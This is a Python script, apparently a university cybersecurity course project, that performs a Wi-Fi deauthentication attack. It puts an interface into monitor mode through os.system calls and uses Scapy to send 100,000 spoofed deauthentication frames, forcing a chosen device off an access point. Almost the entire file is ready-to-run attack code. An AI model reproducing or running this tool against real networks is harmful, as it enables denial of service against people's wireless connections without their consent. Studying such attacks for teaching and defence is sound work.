"""
Univerità degli studi di Bologna
Project for the Cybersecurity course
Academic year 2024/2025

Script to send deauthentication packets to disconnect a target device from a Wi-Fi access point.  
Uses Scapy to craft and transmit deauth frames, requiring a network interface in monitor mode.  

Usage: python deauth.py -t <target_mac> -a <ap_mac> -i <interface>
- target_mac: MAC address of the target device
- ap_mac: MAC address of the access point
- interface: Network interface in monitor mode

Authors:
- Emanuele Grasso   (0001141478)
- Simone Rinaldi    (0001140193)
"""

#!/usr/bin/env python3

import argparse
import os
from scapy.all import *

def get_args():
    """
    Parse command-line arguments.
    
    Returns:
        argparse.Namespace: Parsed command-line arguments containing target MAC, AP MAC, and network interface.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="MAC address of the target device")
    parser.add_argument("-a", "--ap", required=True, help="MAC address of the access point")
    parser.add_argument("-i", "--interface", required=True, help="Network interface in monitor mode")
    return parser.parse_args()

def enable_monitor_mode(interface):
    """
    Enable monitor mode on the specified network interface.
    
    Args:
        interface (str): Network interface to configure in monitor mode.
    """
    print(f"[*] Setting {interface} to monitor mode")
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")

def send_deauth_packets(target_mac, ap_mac, interface):
    """
    Send deauthentication packets to forcibly disconnect a target device from the AP.
    
    Args:
        target_mac (str): MAC address of the target device.
        ap_mac (str): MAC address of the access point.
        interface (str): Network interface set in monitor mode.
    """
    # Construct a deauthentication frame targeting the specific device
    deauth_packet = RadioTap() / Dot11(
        type=0,             # Management frame
        subtype=12,         # Deauthentication frame
        addr1=target_mac,   # Target device MAC address (destination)
        addr2=ap_mac,       # AP MAC address (source)
        addr3=ap_mac        # BSSID (AP MAC)
    ) / Dot11Deauth(reason=7)  # Reason code 7: Class 3 frame received from non-associated STA
    
    print(f"[*] Sending deauthentication packets to {target_mac} from {ap_mac} via {interface}")
    try:
        # Continuously send deauth packets
        sendp(deauth_packet, iface=interface, inter=0.1, count=100000, verbose=True)
        print("[*] Deauthentication attack completed.")
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    args = get_args()
    enable_monitor_mode(args.interface)
    send_deauth_packets(args.target, args.ap, args.interface)
